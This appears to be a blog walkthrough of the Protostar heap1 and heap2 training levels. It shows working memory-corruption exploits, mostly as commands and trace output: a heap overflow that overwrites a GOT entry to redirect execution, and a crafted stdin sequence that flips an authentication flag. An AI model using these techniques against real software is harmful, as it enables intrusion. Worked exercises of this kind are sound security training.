</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 AAAA BBBB
</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff834, 0x8048580, 0x8048570 &lt;unfinished ...>
</span><span class='line'>malloc(8)                        = 0x0804a008
</span><span class='line'>malloc(8)                        = 0x0804a018
</span><span class='line'>malloc(8)                        = 0x0804a028
</span><span class='line'>malloc(8)                        = 0x0804a038
</span><span class='line'>strcpy(0x0804a018, &ldquo;AAAA&rdquo;)       = 0x0804a018
</span><span class='line'>strcpy(0x0804a038, &ldquo;BBBB&rdquo;)       = 0x0804a038
</span><span class='line'>puts(&ldquo;and that&rsquo;s a wrap folks!"and that&rsquo;s a wrap folks!
</span><span class='line'>)                   = 25
</span><span class='line'>+++ exited (status 25) +++</span></code></pre></td></tr></table></div></figure></p>

<p>We have four allocated chunks in memory:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(8) 0x0804a000: i1-control
</span><span class='line'>(4) 0x0804a008: i1-priority
</span><span class='line'>(4) 0x0804a00c: i1-name(addr)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a010: i1-name-control
</span><span class='line'>(8) 0x0804a018: i1-name&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a020: i2-control
</span><span class='line'>(4) 0x0804a028: i2-priority
</span><span class='line'>(4) 0x0804a02c: i2-name(addr)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a030: i2-name-control
</span><span class='line'>(8) 0x0804a038: i2-name</span></code></pre></td></tr></table></div></figure></p>

<p>After 20 bytes, we are able to change <code>i2-name(addr)</code>, that is used by second <code>strcpy()</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace -e strcpy /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x44444444].pack(&ldquo;V&rdquo;) &rsquo;) 2222
</span><span class='line'>strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAADDDD&rdquo;)      = 0x0804a018
</span><span class='line'>strcpy(0x44444444, &ldquo;2222&rdquo; &lt;unfinished ...>
</span><span class='line'>&mdash; SIGSEGV (Segmentation fault) &mdash;
</span><span class='line'>+++ killed by SIGSEGV +++</span></code></pre></td></tr></table></div></figure></p>

<p>We use <code>Global Offset Table Hijacking</code> technique:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -TR /opt/protostar/bin/heap1&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>/opt/protostar/bin/heap1:     file format elf32-i386&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>DYNAMIC SYMBOL TABLE:
</span><span class='line'>00000000  w   D  &lt;em>UND&lt;/em>  00000000              &lt;strong>gmon_start&lt;/strong>
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   &lt;em>_libc_start_main
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   strcpy
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   printf
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   time
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   malloc
</span><span class='line'>00000000      DF &lt;em>UND&lt;/em>  00000000  GLIBC_2.0   puts
</span><span class='line'>0804862c g    DO .rodata    00000004  Base        &lt;/em>IO_stdin_used&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>0804974c R_386_GLOB_DAT    &lt;strong>gmon_start&lt;/strong>
</span><span class='line'>0804975c R_386_JUMP_SLOT   &lt;strong>gmon_start&lt;/strong>
</span><span class='line'>08049760 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>08049764 R_386_JUMP_SLOT   strcpy
</span><span class='line'>08049768 R_386_JUMP_SLOT   printf
</span><span class='line'>0804976c R_386_JUMP_SLOT   time
</span><span class='line'>08049770 R_386_JUMP_SLOT   malloc
</span><span class='line'>08049774 R_386_JUMP_SLOT   puts&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ nm /opt/protostar/bin/heap1 | grep winner
</span><span class='line'>08048494 T winner</span></code></pre></td></tr></table></div></figure></p>

<p>Goal is to write the value <code>0x08048494</code> to the <code>0x08049774</code> address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>strcpy(i1->name, argv[1]):
</span><span class='line'>(8) 0x0804a000: i1-control
</span><span class='line'>(4) 0x0804a008: i1-priority
</span><span class='line'>(4) 0x0804a00c: i1-name(addr)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a010: i1-name-control
</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a020: i2-control          # AAAAAAAA
</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a030: i2-name-control   &lt;br/>
</span><span class='line'>(8) 0x0804a038: i2-name&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>strcpy(i2->name, argv[2]):
</span><span class='line'>(8) 0x0804a000: i1-control
</span><span class='line'>(4) 0x0804a008: i1-priority
</span><span class='line'>(4) 0x0804a00c: i1-name(addr)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a010: i1-name-control
</span><span class='line'>(8) 0x0804a018: i1-name             # AAAAAAAA&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a020: i2-control          # AAAAAAAA
</span><span class='line'>(4) 0x0804a028: i2-priority         # AAAA
</span><span class='line'>(4) 0x0804a02c: i2-name(addr)       # [0x08049774].pack(&ldquo;V&rdquo;)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(8) 0x0804a030: i2-name-control
</span><span class='line'>(8) 0x0804a038: i2-name             # [0x08048494].pack(&ldquo;V&rdquo;)</span></code></pre></td></tr></table></div></figure></p>

<p>The second <code>strcpy()</code> takes <code>i2-name(addr) = 0x08049774</code> and copies over there the <code>argv[2]</code> value.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
</span><span class='line'>__libc_start_main(0x80484b9, 3, 0xbffff824, 0x8048580, 0x8048570 &lt;unfinished ...>
</span><span class='line'>malloc(8)                                                   = 0x0804a008
</span><span class='line'>malloc(8)                                                   = 0x0804a018
</span><span class='line'>malloc(8)                                                   = 0x0804a028
</span><span class='line'>malloc(8)                                                   = 0x0804a038
</span><span class='line'>strcpy(0x0804a018, &ldquo;AAAAAAAAAAAAAAAAAAAAt\227\004\b&rdquo;)       = 0x0804a018
</span><span class='line'>strcpy(0x08049774, &ldquo;\224\204\004\b&rdquo;)                        = 0x08049774
</span><span class='line'>puts(&ldquo;and that&rsquo;s a wrap folks!&rdquo; &lt;unfinished ...>
</span><span class='line'>time(NULL)                                                  = 1435153654
</span><span class='line'>printf(&ldquo;and we have a winner @ %d\n&rdquo;, 1435153654and we have a winner @ 1435153654
</span><span class='line'>)                                                                             = 34
</span><span class='line'>&lt;&hellip; puts resumed> )                                                                                                          = 34
</span><span class='line'>+++ exited (status 34) +++</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap1 $(ruby -e &lsquo;print &ldquo;A&rdquo; * 20 + [0x08049774].pack(&ldquo;V&rdquo;)&rsquo;) $(ruby -e &lsquo;print [0x08048494].pack(&ldquo;V&rdquo;)&rsquo;)
</span><span class='line'>and we have a winner @ 1435149585</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Heap2</h2>

<p><figure class='code'><figcaption><span>heap2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">auth</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">auth</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="n">auth</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">auth</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">service</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span> <span class="n">auth</span> <span class="o">=</span> <span class="o">%</span><span class="n">p</span><span class="p">,</span> <span class="n">service</span> <span class="o">=</span> <span class="o">%</span><span class="n">p</span> <span class="p">]</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">auth</span><span class="p">,</span> <span class="n">service</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;auth &quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">auth</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">auth</span><span class="p">));</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">31</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">strcpy</span><span class="p">(</span><span class="n">auth</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">name</span><span class="p">,</span> <span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;reset&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;service&quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">service</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">7</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login&quot;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">auth</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">auth</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you have logged in already!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;please enter your password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Running the binary:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth 1234
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>service 5678
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>login
</span><span class='line'>please enter your password
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure></p>

<p>This is strange, the <code>service</code> variable is allocated at <code>0x0804c018</code>, but
obviously we cannot have the following heap chucks:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: auth-control
</span><span class='line'>(32) 0x0804c008: auth-name
</span><span class='line'>(04) 0x0804c028: auth-auth&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(08) 0x0804c010: service-control
</span><span class='line'>(xx) 0x0804c018: service</span></code></pre></td></tr></table></div></figure></p>

<p>There should be <code>sizeof(struct auth) = 32+4</code> instead of <code>sizeof(auth) = 4</code> and in
our buggy code we allocated only four bytes of memory:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auth = malloc(sizeof(auth));
</span><span class='line'>memset(auth, 0, sizeof(auth));</span></code></pre></td></tr></table></div></figure></p>

<p>This is very simple <code>Use-After-Free</code> vulnerability. We need to write something
to <code>auth-auth</code>, after <code>0x0804c028-0x0804c018 = 16</code> bytes.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap2
</span><span class='line'>__libc_start_main(0x8048934, 1, 0xbffff864, 0x804acc0, 0x804acb0 &lt;unfinished ...>
</span><span class='line'>printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, (nil), (nil)[ auth = (nil), service = (nil) ]
</span><span class='line'>)                                                                         = 34
</span><span class='line'>fgets(auth A
</span><span class='line'>&ldquo;auth A\n&rdquo;, 128, 0xb7fd8420)                                                                                            = 0xbffff730
</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                               = 0
</span><span class='line'>sysconf(30, 0, 0xb7fe1b28, 1, 0)                                                                                              = 4096
</span><span class='line'>sbrk(4096)                                                                                                                    = 0x0804c000
</span><span class='line'>sbrk(0)                                                                                                                       = 0x0804d000
</span><span class='line'>memset(0x0804c008, &lsquo;\000&rsquo;, 4)                                                                                                 = 0x0804c008
</span><span class='line'>strlen(&ldquo;A\n&rdquo;)                                                                                                                 = 2
</span><span class='line'>strcpy(0x0804c008, &ldquo;A\n&rdquo;)                                                                                                     = 0x0804c008
</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                               = -17
</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                             = -18
</span><span class='line'>strncmp(&ldquo;auth A\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                               = -11
</span><span class='line'>printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, (nil)[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>)                                                                     = 38
</span><span class='line'>fgets(service AAAAAAAAAAAAAAA
</span><span class='line'>&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, 128, 0xb7fd8420)                                                                           = 0xbffff730
</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                              = 18
</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                              = 1
</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                            = 0
</span><span class='line'>strdup(&ldquo; AAAAAAAAAAAAAAA\n&rdquo;)                                                                                                  = 0x0804c018
</span><span class='line'>strncmp(&ldquo;service AAAAAAAAAAAAAAA\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                              = 7
</span><span class='line'>printf(&ldquo;[ auth = %p, service = %p ]\n&rdquo;, 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>)                                                                 = 42
</span><span class='line'>fgets(login
</span><span class='line'>&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = 0xbffff730
</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;auth &rdquo;, 5)                                                                                                = 11
</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;reset&rdquo;, 5)                                                                                                = -6
</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;service&rdquo;, 6)                                                                                              = -7
</span><span class='line'>strncmp(&ldquo;login\n&rdquo;, &ldquo;login&rdquo;, 5)                                                                                                = 0
</span><span class='line'>puts(&ldquo;you have logged in already!"you have logged in already!
</span><span class='line'>)                                                                                           = 28
</span><span class='line'>printf(&rdquo;[ auth = %p, service = %p ]\n", 0x804c008, 0x804c018[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>)                                                                 = 42
</span><span class='line'>fgets(&ldquo;login\n&rdquo;, 128, 0xb7fd8420)                                                                                             = NULL
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure></p>

<p>As we can see above, we sent 15 character + newline.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/heap2
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth A
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>service AAAAAAAAAAAAAAA
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>login
</span><span class='line'>you have logged in already!
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;puts &ldquo;auth A&rdquo;; puts &ldquo;service &rdquo; + &ldquo;A&rdquo; * 15; puts &ldquo;login&rdquo;&rsquo; | /opt/protostar/bin/heap2
</span><span class='line'>[ auth = (nil), service = (nil) ]
